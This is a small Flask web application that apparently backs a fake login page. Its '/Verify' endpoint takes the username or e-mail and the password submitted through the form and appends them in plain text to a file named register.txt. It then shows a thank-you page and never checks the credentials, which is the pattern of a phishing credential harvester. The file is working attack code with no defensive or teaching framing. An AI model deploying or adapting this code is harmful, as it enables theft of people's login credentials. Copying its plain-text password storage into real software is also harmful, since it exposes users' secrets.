from flask import Flask, request, render_template

app = Flask(__name__)


@app.route('/')
@app.route('/home')
def index():
    return render_template("home.html")


@app.route('/Verify', methods=["GET", "POST"])
def Verify():
    if request.method == "POST":
        usr = request.form.get("username")
        password = request.form.get("password")
        print("Done")
        with open("register.txt", "a") as file:
            file.write("=========================== \n")
            file.write("User/E-mail: ")
            file.write(f"{usr}\n")
            file.write("Password: ")
            file.write(f"{password}\n")

    return render_template("thank-you.html")


@app.route("/login")
def login():
    return render_template("login.html")


@app.errorhandler(404)
def error(e):
    return render_template("404.html")


if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0')
